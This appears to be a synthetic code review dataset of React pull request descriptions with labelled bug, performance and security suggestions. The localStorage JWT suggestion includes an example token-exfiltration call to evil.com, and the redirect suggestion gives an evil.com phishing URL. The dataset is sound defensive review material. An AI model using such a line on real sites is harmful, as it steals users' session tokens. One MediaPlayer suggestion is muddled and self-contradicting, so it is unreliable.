pullRequest.body: Add AuthProvider context component that manages user session state, JWT token refresh, and provides authentication methods to the app.

codeSuggestions.label: performance
codeSuggestions.suggestionContent: The context value object passed to AuthContext.Provider on lines 94-101 is a new object literal created on every render. Additionally, the login, logout, and refreshToken functions are recreated on every render since they are plain closures. React uses referential equality to determine whether context consumers need to re-render. Because the value prop is always a new object, every component calling useAuth() will re-render whenever AuthProvider re-renders, even if user, isLoading, and token have not changed. In a large app with dozens of consumers (navbar, sidebar, route guards, etc.), this causes expensive cascading re-renders on every unrelated parent state change. Wrap login/logout/refreshToken in useCallback and the value object in useMemo.
codeSuggestions.oneSentenceSummary: Context value object and closures recreated on every render causes all useAuth consumers to re-render unnecessarily

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The login function defined on lines 58-68 captures the stale closure over the component's state at the time of render. If a user rapidly clicks the login button twice (e.g., double-click), the first call sets isLoading=true and begins the API request. When the second call fires before the first completes, it also reads isLoading as the value from its closure (which may still be the old value). Both requests proceed concurrently, and when they resolve, the second setUser call may overwrite the first with different data, or the finally block may set isLoading=false while the other request is still pending. The login function should be wrapped in useCallback with proper dependencies and include a guard against concurrent invocations.
codeSuggestions.oneSentenceSummary: Stale closure in login callback allows concurrent login attempts to race and corrupt user state

codeSuggestions.label: security
codeSuggestions.existingCode: localStorage.setItem('auth_token', newToken);
codeSuggestions.suggestionContent: JWT tokens are stored in localStorage on line 34 (read), line 63 (write on login), and line 81 (write on refresh). localStorage is accessible by any JavaScript running on the page, including third-party scripts and browser extensions. If the application has any XSS vulnerability (even in a third-party dependency), an attacker can exfiltrate the token with document.cookie or fetch('https://evil.com?t='+localStorage.getItem('auth_token')). JWT tokens should be stored in httpOnly, Secure, SameSite=Strict cookies set by the server, which are completely inaccessible to JavaScript. The server should return the token via Set-Cookie header instead of a JSON response body.
codeSuggestions.oneSentenceSummary: JWT token stored in localStorage is vulnerable to XSS token theft from any injected script

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The useEffect on lines 33-41 calls fetchCurrentUser(savedToken) which is an async operation, but there is no AbortController or cleanup function to cancel the in-flight request. If the AuthProvider unmounts while the API call to /me is still pending (e.g., user navigates away from a route that conditionally renders the provider, or the app's error boundary replaces it), the promise resolves and calls setUser() and setIsLoading() on an unmounted component. This causes the React 'Can't perform a React state update on an unmounted component' warning and can lead to memory leaks. Should use an AbortController passed to the fetch, with cleanup in the effect's return function.
codeSuggestions.oneSentenceSummary: Missing abort controller in initial fetchCurrentUser effect causes state update on unmounted component

pullRequest.body: Add generic DataTable component with sortable columns, text filtering, and pagination for displaying tabular data across the application.

codeSuggestions.label: performance
codeSuggestions.suggestionContent: The filter-and-sort pipeline on lines 28-41 runs on every single render, even when data, filterText, sortField, and sortDirection have not changed. For example, if the parent component re-renders due to an unrelated state change, or if the pagination buttons are clicked, the entire dataset is re-filtered and re-sorted despite only the currentPage changing. With a dataset of 10,000+ rows, this causes visible lag on every page change and every keystroke in other inputs. The filtered/sorted result should be wrapped in useMemo with [data, filterText, sortField, sortDirection] as dependencies, so pagination changes skip the expensive computation.
codeSuggestions.oneSentenceSummary: Sorting and filtering computed on every render without useMemo causes unnecessary recomputation on unrelated state changes

codeSuggestions.label: bug
codeSuggestions.existingCode:
{rows.map((row, i) => (
            <tr key={i} onClick={() => onRowClick?.(row)} className="clickable-row">
codeSuggestions.improvedCode:
{rows.map((row, i) => (
            <tr key={row.id ?? i} onClick={() => onRowClick?.(row)} className="clickable-row">
codeSuggestions.suggestionContent: Using the array index as the key prop on line 81 (`key={i}`) causes incorrect DOM recycling when rows are reordered (by sorting) or when rows are filtered out. React uses keys to match old and new virtual DOM nodes. When the user sorts from ascending to descending, row 0 changes from 'Apple' to 'Zebra', but React thinks it is the same element (key=0) and reuses the DOM node, potentially preserving stale input states, focus, or animation state from the old row. If onRowClick handlers are attached, clicking after a sort may dispatch the wrong row data. Should use a stable, unique identifier: `key={row.id ?? String(row[columns[0].key])}`.
codeSuggestions.oneSentenceSummary: Using array index as key causes incorrect DOM recycling when rows are reordered by sorting or filtered

codeSuggestions.label: security
codeSuggestions.existingCode: : <span dangerouslySetInnerHTML={{ __html: String(row[col.key]) }} />
codeSuggestions.improvedCode: : String(row[col.key])
codeSuggestions.suggestionContent: Line 86 renders cell values using dangerouslySetInnerHTML without any sanitization. When a column does not have a custom render function, the fallback path converts the cell value to a string and renders it as raw HTML. If any row data comes from user input (e.g., a user's name field, a product description, a comment), an attacker can inject malicious content such as '' which executes JavaScript in every user's browser viewing the table. The dangerouslySetInnerHTML should be removed entirely; plain text rendering with React's default escaping is sufficient here.
codeSuggestions.oneSentenceSummary: XSS via dangerouslySetInnerHTML renders user-controlled cell data as raw HTML without sanitization

pullRequest.body: Add real-time ChatWidget component with WebSocket connection, message history, typing indicators, and inline delete functionality.

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The useEffect on lines 44-68 creates a new WebSocket connection but does not return a cleanup function that calls ws.close(). When the component unmounts (e.g., user navigates to a different page) or when roomId/wsUrl changes triggering a re-run of the effect, the old WebSocket remains open. Each re-render of the effect creates an additional connection without closing the previous one. Over time this leaks WebSocket connections, consuming server resources and bandwidth. The orphaned connections also continue to fire onmessage handlers that call setMessages and setIsConnected on a potentially unmounted component. Must add `return () => ws.close();` as the cleanup function.
codeSuggestions.oneSentenceSummary: WebSocket connection not closed on unmount or dependency change leaks connections and causes state updates on unmounted component

codeSuggestions.label: bug
codeSuggestions.existingCode:
setMessages([...messages, message]);
    setInputText('');
codeSuggestions.improvedCode:
setMessages(prev => [...prev, message]);
    setInputText('');
codeSuggestions.suggestionContent: The sendMessage function on lines 74-92 is an async function that calls setMessages and setInputText after sending via WebSocket. If the component unmounts between the ws.send() call and the state updates (e.g., user navigates away immediately after clicking Send), the setState calls target an unmounted component. Additionally, the function captures `messages` and `inputText` from the closure at render time. If the user types and sends multiple messages rapidly, each sendMessage invocation has a stale copy of messages from its closure, so the setMessages call on line 90 uses spread with the old array, potentially dropping messages that were added by concurrent sendMessage calls or incoming WebSocket messages. Should use functional updater: setMessages(prev => [...prev, message]) and add a mounted ref guard.
codeSuggestions.oneSentenceSummary: Race condition in sendMessage due to stale closure over messages array can drop concurrent messages

codeSuggestions.label: bug
codeSuggestions.existingCode:
if (data.type === 'message') {
        setMessages([...messages, data.payload]);
codeSuggestions.improvedCode:
if (data.type === 'message') {
        setMessages(prev => [...prev, data.payload]);
codeSuggestions.suggestionContent: The ws.onmessage handler on lines 52-58 uses `setMessages([...messages, data.payload])` which captures the `messages` array from the closure at the time the effect ran (initially an empty array). Because the effect has [roomId, wsUrl] as dependencies and does not re-run when messages change, the handler always spreads the stale initial messages array. When message A arrives, it correctly produces [A]. But when message B arrives, the handler still sees the original empty array and produces [B] instead of [A, B], effectively overwriting message A. This is a classic stale closure bug. Must use the functional updater form: `setMessages(prev => [...prev, data.payload])`.
codeSuggestions.oneSentenceSummary: Stale closure in ws.onmessage overwrites messages because handler captures initial empty messages array

codeSuggestions.label: performance
codeSuggestions.existingCode: <MessageList messages={messages} onDelete={(id) => handleDelete(id)} />
codeSuggestions.improvedCode: <MessageList messages={messages} onDelete={handleDelete} />
codeSuggestions.suggestionContent: On line 113, the onDelete prop passed to MessageList is an inline arrow function: `onDelete={(id) => handleDelete(id)}`. Since MessageList is wrapped in React.memo (line 22), it should only re-render when its props change. However, this inline arrow function creates a new function reference on every render of ChatWidget, causing React.memo's shallow comparison to always detect a prop change, defeating the memoization entirely. Every time ChatWidget re-renders (e.g., typing in the input, receiving a typing indicator), MessageList re-renders the entire message list. With hundreds of messages, this causes noticeable jank. Should pass a stable reference: `onDelete={handleDelete}` (and wrap handleDelete in useCallback).
codeSuggestions.oneSentenceSummary: Inline arrow function as onDelete prop defeats React.memo on MessageList causing unnecessary re-renders

pullRequest.body: Add drag-and-drop FileUploader component with progress bar, image preview, and client-side file type validation.

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The uploadFile function on lines 46-91 creates an XMLHttpRequest but never stores a reference to it for cleanup. If the component unmounts while an upload is in progress (e.g., user navigates away), the XHR continues in the background and its load/error/progress callbacks call setProgress, setIsUploading, and onUploadComplete on an unmounted component. This causes the React warning 'Can't perform a React state update on an unmounted component' and leaks memory. Should store the xhr reference in a ref and call xhr.abort() in a useEffect cleanup, or at minimum check a mounted ref before calling setState in the callbacks.
codeSuggestions.oneSentenceSummary: XMLHttpRequest not aborted on unmount causes state updates on unmounted component and memory leaks

codeSuggestions.label: security
codeSuggestions.suggestionContent: The file type validation on lines 31-43 is client-side only and can be trivially bypassed. Worse, lines 33-34 explicitly allow files with empty MIME type or 'application/octet-stream' to pass validation, which is the fallback type for any unknown file. An attacker can rename a malicious .exe, .sh, or .html file, which will have an empty or octet-stream MIME type, and it will bypass the validation entirely. The client-side check on file.type is also unreliable because MIME types are determined by the browser based on file extension, which can be spoofed. Must validate file type server-side by checking magic bytes/file signatures, and remove the fallback that accepts unknown types.
codeSuggestions.oneSentenceSummary: Client-only file type validation with fallback accepting unknown types allows upload of arbitrary malicious files

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The uploadFile function does not cancel a previous in-progress upload when a new file is selected. If the user drops a file, then drops another file while the first is still uploading, both XHR requests run concurrently. Both set progress via setProgress, so the progress bar jumps erratically between the two uploads' progress values (e.g., 40% -> 10% -> 50% -> 20%). When the first upload completes, it calls setIsUploading(false) and setProgress(0), resetting the UI while the second upload is still in progress. The onUploadComplete callback may also fire for the wrong file. Should abort the previous XHR before starting a new one by storing the current xhr in a ref and calling xhrRef.current?.abort() at the start of uploadFile.
codeSuggestions.oneSentenceSummary: Starting a new upload without canceling the previous one causes progress bar to jump between concurrent uploads

pullRequest.body: Add DashboardLayout component with sidebar navigation, breadcrumbs, responsive behavior, and redirect handling for the authenticated app shell.

codeSuggestions.label: performance
codeSuggestions.suggestionContent: Multiple inline style objects are created on every render throughout the component. On line 84, the root div creates `style={{ display: 'flex', minHeight: '100vh', backgroundColor: theme.colors.bg }}`. On lines 88-93, the aside creates another style object. On lines 106-110, main creates yet another. Line 60 in renderNavItem creates a style per nav item per render, and line 112 creates one for breadcrumbs. Each of these is a new object reference on every render, which prevents React from short-circuiting the DOM update for those attributes. In a layout component that wraps the entire app, this means every state change (sidebar toggle, resize, navigation) recreates all style objects and triggers DOM style recalculation. Should memoize styles with useMemo or extract to CSS classes / styled-components.
codeSuggestions.oneSentenceSummary: New inline style objects created on every render in layout component triggers unnecessary DOM style recalculations

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The useEffect on lines 30-32 fetches navigation items for the given userId but has an empty dependency array []. This means it only runs once on mount with the initial userId. If the application supports user switching (e.g., admin impersonating another user, or multi-account switching), the userId prop changes but the effect does not re-run, so the sidebar continues to show the previous user's navigation items. The user sees navigation links they don't have permission to access, or misses links they should see. Must add userId to the dependency array.
codeSuggestions.oneSentenceSummary: useEffect missing userId dependency causes navigation to not update when user switches accounts

codeSuggestions.label: security
codeSuggestions.suggestionContent: Lines 34-39 read a 'redirect' parameter from the URL search params and pass it directly to navigate() without any validation. An attacker can craft a URL like 'https://app.example.com/dashboard?redirect=https://evil.com/phishing' and send it to a victim. When the victim clicks the link, the app automatically navigates to the attacker's site, which can mimic the login page to steal credentials (open redirect attack). Even with client-side routing, navigate() with an absolute URL or protocol-relative URL (//evil.com) will navigate the browser to an external site. Must validate that the redirect path is relative and starts with '/' without '//' prefix.
codeSuggestions.oneSentenceSummary: Unvalidated redirect from URL params allows open redirect attacks to phishing sites

codeSuggestions.label: bug
codeSuggestions.suggestionContent: The useEffect on lines 41-49 adds a window resize event listener via window.addEventListener('resize', handleResize) but does not return a cleanup function. Every time the effect re-runs (currently only once due to []), the listener accumulates. More critically, when the DashboardLayout unmounts (e.g., user logs out and the layout is removed from the tree), the handleResize callback continues to fire on every window resize, calling setIsMobile and setIsSidebarOpen on an unmounted component. This causes memory leaks and React warnings. Must return a cleanup function: `return () => window.removeEventListener('resize', handleResize);`.
codeSuggestions.oneSentenceSummary: Window resize event listener not cleaned up on unmount causes memory leaks and state updates on unmounted component

pullRequest.body: Add SearchAutocomplete component with debounced API search, keyboard navigation, and dropdown suggestions list.

codeSuggestions.label: bug
codeSuggestions.suggestionContent: Race condition in search requests. When a user types quickly (e.g., 'rea' -> 'reac' -> 'react'), the debounce fires multiple API calls in sequence. If the response for 'rea' arrives after the response for 'react' (due to variable network latency), stale results for 'rea' overwrite the correct results for 'react'. The user sees results matching 'rea' even though the input shows 'react'. This is a classic async race condition. Should use an AbortController to cancel in-flight requests when a new search is triggered, or track a request ID and only apply results if the ID matches the latest request.
codeSuggestions.oneSentenceSummary: Race condition: stale search responses can overwrite newer results when API calls resolve out of order

codeSuggestions.label: performance
codeSuggestions.suggestionContent: Debounce function recreated on every render. The `debounce(fetchResults, 300)` call on line 49 is inside the component body, so it executes on every render, creating a brand new debounce wrapper with a fresh timer each time. When the user types a character: setState triggers re-render -> new debounce instance created -> old timer from previous instance is lost -> new timer starts -> the 300ms never completes because each keystroke creates a new debounce. Paradoxically, this means the search fires on EVERY keystroke with a 300ms delay instead of debouncing. Should use useRef to persist the debounce instance, or useMemo/useCallback with the debounce wrapper.
codeSuggestions.oneSentenceSummary: Debounce instance recreated on every render, defeating the debounce mechanism entirely

codeSuggestions.label: bug
codeSuggestions.existingCode: const [selectedIndex, setSelectedIndex] = useState(0);
codeSuggestions.suggestionContent: Keyboard navigation selectedIndex not reset when results change. The `selectedIndex` state (initialized to 0 on line 27) persists across result updates. Scenario: user searches 'react', gets 10 results, presses ArrowDown 7 times (selectedIndex = 7), then changes search to 'vue' which returns 3 results. selectedIndex is still 7, but results only has indices 0-2. Pressing Enter on line 69 accesses `results[7]` which is undefined, and the `if (results[selectedIndex])` check silently does nothing. More subtly, the visual highlight (line 103 `idx === selectedIndex`) shows no item highlighted, confusing the user. Should reset selectedIndex to 0 whenever results change.
codeSuggestions.oneSentenceSummary: Keyboard selectedIndex persists across result changes, causing wrong item selection or no visible highlight

pullRequest.body: Add multi-step FormWizard component with per-step validation, draft saving, and step navigation for onboarding flow.

codeSuggestions.label: bug
codeSuggestions.suggestionContent: Form data lost on step navigation. The StepForm child component uses its own `useState<Record<string, any>>({})` on line 21 to track local input values. When the user navigates to the next step and back, StepForm unmounts and remounts, resetting `localData` to an empty object. Although `formData` in the parent retains values via `onChange`, the input displays `localData[field] ?? data[field] ?? ''` (line 37), which would show the parent's data. However, the real issue is that localData and formData can get out of sync: if the user types in step 1, goes to step 2, comes back to step 1, the localData is empty but formData has values. Any edit in step 1 now spreads localData (which only has the one edited field) while formData has all fields. The dual-state design is fragile. Should remove localData and use only the lifted formData from the parent.
codeSuggestions.oneSentenceSummary: StepForm's local useState resets on unmount/remount during step navigation, causing data sync issues with parent state

codeSuggestions.label: bug
codeSuggestions.suggestionContent: Validation runs after step change, validating wrong state. In `goToNext` (line 70), `setCurrentStep(currentStep + 1)` is called on line 72 BEFORE validation on line 73. While React batches these updates, the logical flow is wrong: if validation fails (line 75-78), the function returns early, but `setCurrentStep` has already been called. Both state updates are applied in the same render batch, so the user is moved to the next step AND shown validation errors simultaneously. The step advances even when validation fails. Should validate BEFORE calling setCurrentStep.
codeSuggestions.oneSentenceSummary: Step advances before validation check, so user moves to next step even when current step has validation errors

codeSuggestions.label: security
codeSuggestions.suggestionContent: No CSRF token included in form submission. The `handleSubmit` function (line 90) sends a POST request to `apiEndpoint` with `fetch` on line 102, but the headers only include `Content-Type`. No CSRF token is attached. If the API endpoint accepts cookie-based authentication (common in same-origin setups), an attacker can craft a page that submits a form to the same endpoint from a different origin. The browser will include the session cookie automatically, and without a CSRF token the server cannot distinguish the legitimate request from the forged one. Should include a CSRF token in the request headers (e.g., `'X-CSRF-Token': getCsrfToken()`).
codeSuggestions.oneSentenceSummary: POST request to API endpoint lacks CSRF token, making the form submission vulnerable to cross-site request forgery

codeSuggestions.label: performance
codeSuggestions.suggestionContent: Entire form tree re-renders on any single field change. The `handleFieldChange` function (line 53) calls `setFormData({ ...formData, [field]: value })` which creates a new formData reference on every keystroke. Since formData is passed as `data` prop to StepForm (line 132), and StepForm receives all of formData (not just the current step's fields), every keystroke in any field causes the entire FormWizard to re-render, including the step indicators, action buttons, and the StepForm with all its fields. In a form with 20+ fields across steps, this causes noticeable input lag. Should use `React.memo` on StepForm or pass only the current step's data subset.
codeSuggestions.oneSentenceSummary: Every keystroke triggers full FormWizard re-render because setFormData creates new object reference for all fields

pullRequest.body: Add NotificationCenter component with Server-Sent Events for real-time notifications, toast display, and mark-as-read functionality.

codeSuggestions.label: bug
codeSuggestions.suggestionContent: EventSource not closed on component unmount. The `useEffect` on line 24 creates a new `EventSource` connection on line 25 but does not return a cleanup function that calls `eventSource.close()`. When the component unmounts (e.g., user navigates away), the SSE connection remains open, leaking a server connection. If the component remounts (e.g., navigating back), a second EventSource is created, doubling the connections. After several navigation cycles, dozens of orphaned connections accumulate, exhausting the browser's 6-connections-per-origin limit and potentially overwhelming the server. Should return a cleanup function: `return () => eventSource.close();`.
codeSuggestions.oneSentenceSummary: EventSource connection leaks on unmount because useEffect has no cleanup function to close the SSE stream

codeSuggestions.label: bug
codeSuggestions.existingCode: setNotifications([...notifications, parsed]);
codeSuggestions.improvedCode: setNotifications(prev => [...prev, parsed]);
codeSuggestions.suggestionContent: Stale closure in SSE event handler causes notifications to be lost. On line 30, `setNotifications([...notifications, parsed])` captures the `notifications` array from the closure scope at the time the effect ran (on mount). This closure never updates. When the first notification arrives, `notifications` is `[]`, so result is `[notif1]`. When the second notification arrives, `notifications` is still `[]` (the stale closure), so result is `[notif2]` -- notif1 is lost. Every new notification overwrites all previous ones instead of appending. Should use the functional updater form: `setNotifications(prev => [...prev, parsed])`.
codeSuggestions.oneSentenceSummary: Stale closure captures empty notifications array, so each new SSE notification overwrites all previous ones

codeSuggestions.label: security
codeSuggestions.suggestionContent: XSS via dangerouslySetInnerHTML with unsanitized server data. On lines 106-110, the component renders `notification.richBody` using `dangerouslySetInnerHTML={{ __html: notification.richBody }}`. The `richBody` field comes directly from the SSE server stream, which could contain attacker-controlled content if the notification system accepts user-generated messages (e.g., team mentions, comments). An attacker could set their message body to `` which would execute when rendered. While `{notification.message}` on line 105 is safe (React escapes JSX text), the `dangerouslySetInnerHTML` bypasses all escaping. Should sanitize with DOMPurify: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(notification.richBody) }}`.
codeSuggestions.oneSentenceSummary: Server-provided richBody rendered via dangerouslySetInnerHTML without sanitization enables stored XSS

pullRequest.body: Add MediaPlayer component with audio playback controls, progress tracking, volume control, and interactive playlist.

codeSuggestions.label: bug
codeSuggestions.suggestionContent: Play/pause race condition causes DOMException. The `togglePlay` function (line 42) calls `audioRef.current.play()` on line 49 without awaiting the returned Promise. `play()` returns a Promise that resolves when playback actually starts. If the user rapidly clicks play/pause, `pause()` can be called while a pending `play()` Promise hasn't resolved yet, causing: `DOMException: The play() request was interrupted by a call to pause()`. This is a well-known browser issue. The error is uncaught and can cause the isPlaying state to desync from actual playback state. Should await play() and handle the interruption error gracefully.
codeSuggestions.oneSentenceSummary: Rapid play/pause clicks cause DOMException because play() promise is not awaited before pause() is called

codeSuggestions.label: bug
codeSuggestions.suggestionContent: setInterval progress tracking uses `let` instead of `useRef`, but the real issue is that the interval fires when `isPlaying` changes (line 40 dependency), recreating it correctly. However, `setCurrentTime(audioRef.current.currentTime)` on line 35 triggers a React state update and re-render every 100ms. The `let intervalId` on line 33 is scoped to the effect closure, so cleanup on line 39 does work for THIS effect instance. But the effect depends on `[isPlaying]` -- when `isPlaying` is true, the interval runs continuously calling `setCurrentTime` 10 times per second. Each call triggers a full component re-render including the entire playlist UI. The interval ID is properly cleaned up on dependency change, but the core problem is the 100ms state update cadence.
codeSuggestions.oneSentenceSummary: Progress interval updates state 10 times per second causing excessive re-renders of the entire player and playlist

codeSuggestions.label: performance
codeSuggestions.suggestionContent: setCurrentTime called every 100ms triggers full component re-render including the playlist. The progress tracking interval on line 33 calls `setCurrentTime(audioRef.current.currentTime)` every 100ms (line 35). Each state update causes React to re-render the entire MediaPlayer component, including the playlist `<ul>` with all track `<li>` elements, the volume slider, and all control buttons. For a playlist with 100 tracks, this means ~1000 DOM reconciliation checks per second. The progress bar needs frequent updates for smooth appearance, but the playlist and controls don't change. Should either use a ref for the progress value and only sync to state at a lower frequency, or split the progress display into a separate memoized component.
codeSuggestions.oneSentenceSummary: 100ms setCurrentTime interval re-renders entire component tree including static playlist 10 times per second

codeSuggestions.label: bug
codeSuggestions.suggestionContent: Playlist index out of bounds when reaching the end. The `playNext` function (line 68) increments `trackIndex` unconditionally with `setTrackIndex(trackIndex + 1)` on line 69. When the user is on the last track (trackIndex === playlist.length - 1), this sets trackIndex to `playlist.length`, making `currentTrack` (line 23: `playlist[trackIndex]`) undefined. The `onEnded` handler on line 94 also calls `playNext`, so when the last track finishes playing, the component tries to render `currentTrack?.title` and load `currentTrack?.url` which is undefined, causing the audio element to fail. Should check bounds before incrementing, or wrap around to the beginning of the playlist.
codeSuggestions.oneSentenceSummary: playNext increments trackIndex past playlist.length, causing undefined currentTrack when last track ends

pullRequest.body: Add ThemeProvider with dark/light mode toggle, system preference detection, custom theme overrides, and localStorage persistence.

codeSuggestions.label: performance
codeSuggestions.suggestionContent: Theme context value object recreated on every render. On lines 86-91, the Provider value is an inline object literal `{{ mode, colors, toggleTheme, setCustomTheme }}`. React uses referential equality (`Object.is`) to determine if context value has changed. Since a new object is created on every render, ALL components calling `useTheme()` will re-render whenever ThemeProvider re-renders, even if mode and colors haven't changed. In a typical app with 50+ themed components, any state change in ThemeProvider's parent triggers a cascade of unnecessary re-renders across the entire component tree. Should wrap the value in `useMemo` and stabilize callbacks with `useCallback`.
codeSuggestions.oneSentenceSummary: Context Provider value recreated every render causes all useTheme consumers to re-render on any parent state change

codeSuggestions.label: bug
codeSuggestions.suggestionContent: localStorage access during server-side rendering crashes the app. On line 47, `localStorage.getItem('theme-mode')` is called directly in the `useState` initializer. In SSR environments (Next.js, Remix, etc.), this code runs on the server where `localStorage` is not defined, throwing `ReferenceError: localStorage is not defined` and crashing the server render. This is a common React SSR pitfall. Should use a lazy initializer with a `typeof window !== 'undefined'` guard, or default to 'light' during SSR and sync with localStorage in a useEffect.
codeSuggestions.oneSentenceSummary: Direct localStorage.getItem in useState initializer throws ReferenceError during server-side rendering

codeSuggestions.label: bug
codeSuggestions.suggestionContent: System preference change listener never cleaned up. The `useEffect` on line 55 adds an event listener for media query changes on line 64 (`mediaQuery.addEventListener('change', handler)`) but does not return a cleanup function to remove it. When ThemeProvider unmounts and remounts (e.g., during hot module replacement in development, or route transitions), a new listener is added each time while old listeners remain active. After several remounts, multiple handlers respond to a single system theme change, potentially causing race conditions with `setMode` being called multiple times. Should return `() => mediaQuery.removeEventListener('change', handler)` from the effect.
codeSuggestions.oneSentenceSummary: matchMedia change event listener leaks on unmount because useEffect returns no cleanup function
